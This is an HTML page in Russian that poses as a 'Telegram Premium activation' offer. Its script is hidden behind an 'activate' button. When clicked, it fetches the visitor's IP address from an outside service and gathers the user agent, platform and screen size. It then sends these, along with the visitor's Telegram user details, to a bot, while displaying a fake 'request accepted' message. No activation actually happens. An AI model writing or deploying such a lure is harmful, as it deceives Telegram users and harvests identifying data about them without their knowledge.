<!DOCTYPE html>
<html>
<head>
    <title>Telegram Premium Activation</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background: linear-gradient(to right, #6a11cb, #2575fc);
            color: white;
        }
        .container {
            background: rgba(0,0,0,0.3);
            border-radius: 15px;
            padding: 30px;
            max-width: 600px;
            margin: 0 auto;
        }
        .btn {
            background: #25D366;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ваш Telegram Premium</h1>
        <p>Нажмите кнопку ниже для активации</p>
        <button class="btn" id="activateBtn">АКТИВИРОВАТЬ</button>
        <p id="status"></p>
    </div>

    <script>
        document.getElementById('activateBtn').addEventListener('click', function() {
            const status = document.getElementById('status');
            status.textContent = "Идет обработка...";
            
            // Собираем данные
            const data = {
                ip: "Определяется...",
                browser: navigator.userAgent,
                device: navigator.platform,
                screen: `${screen.width}x${screen.height}`
            };

            // Определение IP
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(ipData => {
                    data.ip = ipData.ip;
                    sendData(data);
                })
                .catch(() => {
                    data.ip = "Не определен";
                    sendData(data);
                });

            function sendData(data) {
                if (window.Telegram && Telegram.WebApp) {
                    // Отправка данных в бота
                    Telegram.WebApp.sendData(JSON.stringify({
                        ...data,
                        tg_user: Telegram.WebApp.initDataUnsafe.user || {}
                    }));
                    status.textContent = "✅ Заявка принята!";
                } else {
                    status.textContent = "Ошибка: откройте через Telegram бота";
                }
            }
        });
    </script>
</body>
</html>
